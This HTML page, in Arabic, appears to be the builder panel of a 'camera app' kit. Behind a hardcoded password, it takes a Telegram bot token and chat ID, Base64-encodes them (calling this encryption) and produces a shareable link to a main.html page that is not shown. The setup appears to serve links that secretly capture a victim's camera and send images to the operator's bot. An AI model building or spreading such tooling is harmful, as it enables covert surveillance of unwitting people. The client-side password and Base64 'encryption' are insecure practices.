<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>إعداد التطبيق</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #6a11cb, #2575fc);
            color: white;
            text-align: center;
            margin: 0;
            padding: 0;
        }

        h1 {
            margin-top: 20px;
            font-size: 2.5em;
            color: #fff;
        }

        .container {
            max-width: 400px;
            margin: 50px auto;
            background: rgba(0, 0, 0, 0.5);
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
        }

        label {
            display: block;
            margin-bottom: 10px;
            font-size: 1.2em;
            text-align: left;
        }

        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 20px;
            border: none;
            border-radius: 5px;
            font-size: 1em;
        }

        input[type="password"] {
            background: #333;
            color: white;
        }

        button {
            padding: 10px 20px;
            font-size: 1.2em;
            color: white;
            background: #2575fc;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: background 0.3s ease;
        }

        button:hover {
            background: #5d8ffc;
        }

        .hidden {
            display: none;
        }

        .error {
            color: #ffcccc;
            margin-bottom: 20px;
        }

        footer {
            margin-top: 30px;
            font-size: 0.9em;
            color: #eee;
        }

        .result {
            margin-top: 20px;
            padding: 10px;
            background: rgba(0, 0, 0, 0.6);
            border-radius: 5px;
            word-wrap: break-word;
        }

        a {
            color: #00ffff;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <h1>إعداد التطبيق</h1>
    <div class="container">
        <div id="password-container">
            <label for="password">أدخل كلمة المرور:</label>
            <input type="password" id="password" placeholder="كلمة المرور">
            <button onclick="checkPassword()">دخول</button>
            <p id="error-message" class="error hidden">كلمة المرور غير صحيحة!</p>
        </div>
        <div id="form-container" class="hidden">
            <form id="info-form" onsubmit="generateEncryptedLink(event)">
                <label for="token">أدخل التوكن:</label>
                <input type="password" id="token" placeholder="توكن البوت" required>
                
                <label for="chat-id">أدخل معرف الشات:</label>
                <input type="password" id="chat-id" placeholder="معرف الشات" required>
                
                <button type="submit">إنشاء الرابط</button>
            </form>
            <div id="result" class="result hidden"></div>
        </div>
    </div>
    <footer>© 2024 - إعداد تطبيق الكاميرا</footer>

    <script>
        const PASSWORD = "Q7CamEra7";

        function checkPassword() {
            const passwordInput = document.getElementById("password");
            const errorMessage = document.getElementById("error-message");
            if (passwordInput.value === PASSWORD) {
                document.getElementById("password-container").classList.add("hidden");
                document.getElementById("form-container").classList.remove("hidden");
            } else {
                errorMessage.classList.remove("hidden");
            }
        }

        function encryptData(data) {
            // تشفير بسيط باستخدام Base64
            return btoa(unescape(encodeURIComponent(data)));
        }

        function generateEncryptedLink(event) {
            event.preventDefault();
            const token = document.getElementById("token").value;
            const chatId = document.getElementById("chat-id").value;

            // دمج البيانات وتشفيرها
            const data = JSON.stringify({ token, chat_id: chatId });
            const encryptedData = encryptData(data);

            // إنشاء الرابط المشفر
            const baseUrl = "main.html";
            const link = `${baseUrl}?data=${encodeURIComponent(encryptedData)}`;

            // عرض الرابط للمستخدم
            const result = document.getElementById("result");
            result.innerHTML = `<strong>رابطك الخاص:</strong> <a href="${link}" target="_blank">${link}</a>`;
            result.classList.remove("hidden");
        }
    </script>
</body>
</html>
